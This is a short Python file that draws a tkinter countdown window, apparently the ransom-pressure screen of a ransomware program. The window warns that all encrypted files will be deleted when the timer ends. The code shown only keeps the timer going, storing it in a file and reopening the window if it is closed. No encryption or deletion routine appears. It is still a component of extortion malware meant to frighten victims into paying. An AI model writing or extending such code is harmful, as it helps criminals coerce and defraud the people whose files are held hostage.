import os
import time
import tkinter as tk

TIME_FILE = "countdown_time.txt"  

def restart_timer():
    root.destroy()
    show_countdown_window()

def show_countdown_window():
    global root
    global label
    root = tk.Tk()
    root.title("Countdown Timer")
    text_label = tk.Label(root, font=('Arial', 12), text='This is a countdown timer: When it ends all the encrypted files will be deleted.')
    text_label.pack()
    label = tk.Label(root, font=('Arial', 24))
    label.pack()
    update_timer()
    root.mainloop()

def update_timer():
    remaining_time = read_remaining_time()
    while remaining_time >= 0:
        remaining_time = read_remaining_time()
        try:
            hours, remainder = divmod(remaining_time, 3600)
            minutes, seconds = divmod(remainder, 60)
            countdown = '{:02d}:{:02d}:{:02d}'.format(hours, minutes, seconds)
            label['text'] = countdown  
            label.update()
        except tk.TclError:
            show_countdown_window()
        write_remaining_time(remaining_time)
        time.sleep(1)
        remaining_time -= 1
        write_remaining_time(remaining_time)
    root.destroy()
    time.sleep(10)
    delete_time_file()

def read_remaining_time():
    if os.path.exists(TIME_FILE):
        try:
            with open(TIME_FILE, 'r') as file:
                remaining_time = int(file.read())
        except: return 100
        return remaining_time
    else:
        return 50
def write_remaining_time(remaining_time):
    with open(TIME_FILE, 'w') as file:
        file.write(str(remaining_time))

def delete_time_file():
    if os.path.exists(TIME_FILE):
        os.remove(TIME_FILE)

